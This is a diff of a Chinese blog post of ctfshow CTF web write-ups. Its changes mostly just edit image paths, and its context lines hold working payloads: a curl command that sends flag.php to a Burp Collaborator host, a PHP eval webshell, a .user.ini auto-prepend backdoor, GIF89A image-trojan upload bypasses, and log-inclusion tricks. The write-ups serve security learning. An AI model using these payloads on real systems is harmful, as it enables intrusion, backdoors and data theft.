-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240427222704594.png" class="" title="image-20240427222704594">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240427222704594.png" class="" title="image-20240427222704594">
 
 <h2 id="web111（全局变量）"><a href="#web111（全局变量）" class="headerlink" title="web111（全局变量）"></a>web111（全局变量）</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -1205,10 +1205,10 @@
 <blockquote>
 <p>我们在本地做实验之前：配置php.ini文件的register_argc_argv &#x3D; On(默认是Off)，重启服务。</p>
 <p>先看第一个图：</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/2727822-20221019165155376-1036882143.png" class="" title="img">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/2727822-20221019165155376-1036882143.png" class="" title="img">
 
 <p>再看第二个：</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/2727822-20221019165242396-670704521.png" class="" title="img">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/2727822-20221019165242396-670704521.png" class="" title="img">
 
 <p> 可以看出来+起到分隔的作用。</p>
 <p>因此我们可以利用parse_str()进行变量覆盖，payload如下：</p>
@@ -1251,7 +1251,7 @@
 
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">s = <span class="string">&#x27;...&#x27;</span> * <span class="number">333333</span> + <span class="string">&#x27;36Dctfshow&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s))</span><br><span class="line">data = <span class="built_in">dict</span>(f=s)</span><br><span class="line">r = requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用最大回溯限制，字符串长度超过一定长度会绕过preg_match</span></span><br></pre></td></tr></table></figure>
 
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240501131230682.png" class="" title="image-20240501131230682">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240501131230682.png" class="" title="image-20240501131230682">
 
 <h2 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h2><blockquote>
 <p>首先查看robots.txt，进入&#x2F;admin页面</p>
@@ -1271,9 +1271,9 @@
 <p>然后就是利用curl去带出flag.php<br><code>curl -F 将flag文件上传到Burp的 Collaborator Client （ Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看 POST请求包以及打Cookies）</code></p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload </span></span><br><span class="line"><span class="comment">#其中-F 为带文件的形式发送post请求</span></span><br><span class="line"><span class="comment">#xx是上传文件的name值，flag.php就是上传的文件 </span></span><br><span class="line">?F=`<span class="variable">$F</span>`;+curl -X POST -F xx=@flag.php  http:<span class="comment">//8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net</span></span><br></pre></td></tr></table></figure>
 
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/20201015162350800.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/20201015162350800.png" class="" title="在这里插入图片描述">
 
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240501133705376.png" class="" title="image-20240501133705376">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240501133705376.png" class="" title="image-20240501133705376">
 
 <p>所以方法原理就是将flag.php上传到bp的Collaborator Client.获得flag</p>
 <h1 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h1><p>下面放上Y1ng写的bash盲注脚本,不过读flag的时候失败了，用 base64编码后也不行，最后用了 grep ‘flag’才正常</p>
@@ -1418,7 +1418,7 @@
 <p>例如，如果 URL 是 <code>example.com/index.php?name=John&amp;age=30</code>，那么使用 <code>extract($_GET);</code> 之后，可以直接使用 <code>$name</code> 和 <code>$age</code> 变量，它们的值分别会是 <code>&quot;John&quot;</code> 和 <code>30</code>。</p>
 <p>存在<code>$isVIP</code>且<code>$ctf</code>中没有冒号，通过extract($_GET),可以get传入?isVIP&#x3D;true就可以绕过过滤了</p>
 <p>post提交<code>ctf=/etc/passwd</code>,有回显,我们可以日志文件包含还有session包含(如果clean up开启就不行,需要条件竞争 )</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240515142013640.png" class="" title="image-20240515142013640">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240515142013640.png" class="" title="image-20240515142013640">
 </blockquote>
 <h2 id="web150-plus"><a href="#web150-plus" class="headerlink" title="web150_plus"></a>web150_plus</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">            <span class="variable">$class</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#过滤字符</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>,<span class="string">&quot;log&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -1433,13 +1433,13 @@
 </blockquote>
 <h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><blockquote>
 <p>按照前两题的思路做，然后</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240515214700328.png" class="">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240515214700328.png" class="">
 
 <p>使用大小写可以绕过</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240516200630926.png" class="" title="image-20240516200630926">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240516200630926.png" class="" title="image-20240516200630926">
 
 <p>但是访问upload&#x2F;1.PHp是直接将文件下载下来，等于无法解析</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240516200712134.png" class="" title="image-20240516200712134">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240516200712134.png" class="" title="image-20240516200712134">
 
 <blockquote>
 <p>在这里用到了.user.ini 和.htaccss文件</p>
@@ -1456,7 +1456,7 @@
 <h2 id="0x01-user-ini"><a href="#0x01-user-ini" class="headerlink" title="0x01 .user.ini"></a>0x01 .user.ini</h2><hr>
 <p>那么什么是.user.ini？</p>
 <p>这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code>。 在此可以查看：<a href="http://php.net/manual/zh/ini.list.php%E8%BF%99%E5%87%A0%E7%A7%8D%E6%A8%A1%E5%BC%8F%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F%E7%9C%8B%E7%9C%8B%E5%AE%98%E6%96%B9%E7%9A%84%E8%A7%A3%E9%87%8A%EF%BC%9A">http://php.net/manual/zh/ini.list.php这几种模式有什么区别？看看官方的解释：</a></p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/2014103002272568560.png" class="" title="enter image description here">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/2014103002272568560.png" class="" title="enter image description here">
 
 <p>其中就提到了，模式为PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，再就是.user.ini中设置。 这里就提到了.user.ini，那么这是个什么配置文件？那么官方文档在<a href="http://php.net/manual/zh/configuration.file.per-user.php">这里</a>又解释了：</p>
 <p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
@@ -1466,10 +1466,10 @@
 <p>而且，和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p>
 <p>然后我们看到php.ini中的配置项，可惜我沮丧地发现，只要稍微敏感的配置项，都是<code>PHP_INI_SYSTEM</code>模式的（甚至是php.ini only的），包括<code>disable_functions</code>、<code>extension_dir</code>、<code>enable_dl</code>等。 不过，我们可以很容易地借助<code>.user.ini</code>文件来构造一个“后门”。</p>
 <p>Php配置项中有两个比较有意思的项（下图第一、四个）：</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/2014103002272554789.png" class="" title="enter image description here">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/2014103002272554789.png" class="" title="enter image description here">
 
 <p><code>auto_append_file</code>、<code>auto_prepend_file</code>，点开看看什么意思：</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/2014103002272569525.png" class="" title="enter image description here">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/2014103002272569525.png" class="" title="enter image description here">
 
 <p>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=01.gif</span><br></pre></td></tr></table></figure>
@@ -1477,23 +1477,23 @@
 <p>01.gif是要包含的文件。</p>
 <p>所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。</p>
 <p>测试一下，我分别在IIS6.0+Fastcgi+PHP5.3和nginx+fpm+php5.3上测试。 目录下有.user.ini，和包含webshell的01.gif，和正常php文件echo.php：</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/2014103002272563350.png" class="" title="enter image description here">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/2014103002272563350.png" class="" title="enter image description here">
 
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/2014103002272650870.png" class="" title="enter image description here">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/2014103002272650870.png" class="" title="enter image description here">
 
 <p>访问echo.php即可看到后门：</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/2014103002272652570.png" class="" title="enter image description here">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/2014103002272652570.png" class="" title="enter image description here">
 
 <p>Nginx下同样：</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/2014103002272682946.png" class="" title="enter image description here">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/2014103002272682946.png" class="" title="enter image description here">
 
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/2014103002272674827.png" class="" title="enter image description here">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/2014103002272674827.png" class="" title="enter image description here">
 
 <p>那么，我们可以猥琐地想一下，在哪些情况下可以用到这个姿势？ 比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 再比如，你只是想隐藏个后门，这个方式是最方便的。</p>
 </blockquote>
 </blockquote>
 <p>这里的服务器为nginx服务器，所以只能使用.user.ini文件</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240516201554375.png" class="" title="image-20240516201554375">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240516201554375.png" class="" title="image-20240516201554375">
 
 <p>然后再上传1.png，不需要改变后缀，然后再用蚁剑连接</p>
 <p><code>https://c7c5c1d0-9b90-4e3a-9415-f1564c1ae2d6.challenge.ctf.show/upload/index.php</code></p>
@@ -1502,7 +1502,7 @@
 </blockquote>
 <h2 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h2><blockquote>
 <p>上传1.png，内容为<code>&lt;?php eval($_POST[&#39;1&#39;]);?&gt;</code>，提示</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240516202857404.png" class="" title="image-20240516202857404">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240516202857404.png" class="" title="image-20240516202857404">
 
 <blockquote>
 <p>试一下php短标签：<br><code>&lt;? echo &#39;123&#39;;?&gt;  #前提是开启配置参数short_open_tags=on</code><br><code>&lt;?=(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt;  #不需要开启参数设置</code><br><code>&lt;% echo &#39;123&#39;;%&gt;   #开启配置参数asp_tags=on，并且只能在7.0以下版本使用</code></p>
@@ -1531,52 +1531,52 @@
 <h2 id="web160（日志包含）"><a href="#web160（日志包含）" class="headerlink" title="web160（日志包含）"></a>web160（日志包含）</h2><blockquote>
 <p>将反引号过滤了，那么使用包含文件日志的方法进行绕过，虽然过滤了log字符串，但是可以使用拼接绕过</p>
 <p><code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code></p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240521190348449.png" class="" title="image-20240521190348449">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240521190348449.png" class="" title="image-20240521190348449">
 </blockquote>
 <h2 id="web161（GIF89A绕过类型验证）"><a href="#web161（GIF89A绕过类型验证）" class="headerlink" title="web161（GIF89A绕过类型验证）"></a>web161（GIF89A绕过类型验证）</h2><blockquote>
 <p>在上传.user.ini文件时就已经无法实现</p>
 <blockquote>
 <h1 id="文件上传漏洞之getimagesize-验证"><a href="#文件上传漏洞之getimagesize-验证" class="headerlink" title="文件上传漏洞之getimagesize()验证"></a>文件上传漏洞之getimagesize()验证</h1><p>getimagesize()简介<br>这个函数功能会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNTg0Mg==,size_16,color_FFFFFF,t_70.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNTg0Mg==,size_16,color_FFFFFF,t_70.png" class="" title="在这里插入图片描述">
 
 <p>这就是图片的十六进制，前几位都是一样的</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNTg0Mg==,size_16,color_FFFFFF,t_70-17166405958773.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNTg0Mg==,size_16,color_FFFFFF,t_70-17166405958773.png" class="" title="在这里插入图片描述">
 
 <p>按照这样的逻辑，我们是不是可以去伪造一个假图片，让函数以为我们这就是图片，达到绕过的目的</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNTg0Mg==,size_16,color_FFFFFF,t_70-17166406057476.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNTg0Mg==,size_16,color_FFFFFF,t_70-17166406057476.png" class="" title="在这里插入图片描述">
 
 <p>我们在pikachu的getimagesize()这个案例当中，先传图片是没有问题的</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNTg0Mg==,size_16,color_FFFFFF,t_70-17166406169969.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNTg0Mg==,size_16,color_FFFFFF,t_70-17166406169969.png" class="" title="在这里插入图片描述">
 
 <p>图片木马的制作</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNTg0Mg==,size_16,color_FFFFFF,t_70-171664062847112.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNTg0Mg==,size_16,color_FFFFFF,t_70-171664062847112.png" class="" title="在这里插入图片描述">
 
 <p>把伪装代码和木马代码放到一起，我在桌面上准备了两张图片和一个php木马，其实一个图片就够了</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/20190513204406374.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/20190513204406374.png" class="" title="在这里插入图片描述">
 
 <p>我们打开cmd，输入</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/2019051320464075.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/2019051320464075.png" class="" title="在这里插入图片描述">
 
 <p>这样图片木马就做好了</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/20190513204655465.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/20190513204655465.png" class="" title="在这里插入图片描述">
 
 <p>这个图片也是能打开的，和正常的看起来没有什么区别，但这个图片的16进制中就会被插入木马代码</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNTg0Mg==,size_16,color_FFFFFF,t_70-171664066739721.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNTg0Mg==,size_16,color_FFFFFF,t_70-171664066739721.png" class="" title="在这里插入图片描述">
 
 <p>我们将这个木马文件放进去试试</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNTg0Mg==,size_16,color_FFFFFF,t_70-171664067552124.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNTg0Mg==,size_16,color_FFFFFF,t_70-171664067552124.png" class="" title="在这里插入图片描述">
 
 <p>我们可以访问一下这个图片</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNTg0Mg==,size_16,color_FFFFFF,t_70-171664068269927.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNTg0Mg==,size_16,color_FFFFFF,t_70-171664068269927.png" class="" title="在这里插入图片描述">
 
 <p>我们可以看到这个图片，但是这个php木马并没有执行<br>接下来我们可以之前讲过的本地包含文件漏洞原理来进行操作<br>我们可以利用include,我们在实际中需要对一些文件包含的点去进行测试，来找到include在哪个目录里，我们在测试中手动尝试一下就行</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNTg0Mg==,size_16,color_FFFFFF,t_70-171664069944530.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNTg0Mg==,size_16,color_FFFFFF,t_70-171664069944530.png" class="" title="在这里插入图片描述">
 
 <p>在这个位置贴入木马图片的连接<br>unsafeupload&#x2F;uploads&#x2F;2019&#x2F;05&#x2F;13&#x2F;7467665cd9816ca54b9660366698.jpeg<br>第一次尝试没有反应<br>我们加几个…&#x2F;<br>两个…&#x2F;后成功了</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNTg0Mg==,size_16,color_FFFFFF,t_70-171664070782333.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNTg0Mg==,size_16,color_FFFFFF,t_70-171664070782333.png" class="" title="在这里插入图片描述">
 
 <p>文件上传漏洞及防范措施</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNTg0Mg==,size_16,color_FFFFFF,t_70-171664072425836.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNTg0Mg==,size_16,color_FFFFFF,t_70-171664072425836.png" class="" title="在这里插入图片描述">
 </blockquote>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89A</span><br><span class="line"><span class="meta">&lt;?=</span> <span class="keyword">include</span><span class="string">&quot;ph&quot;</span>.<span class="string">&quot;p://filter/convert.base64-encode/resource=../flag.p&quot;</span>.<span class="string">&quot;hp&quot;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -1585,7 +1585,7 @@
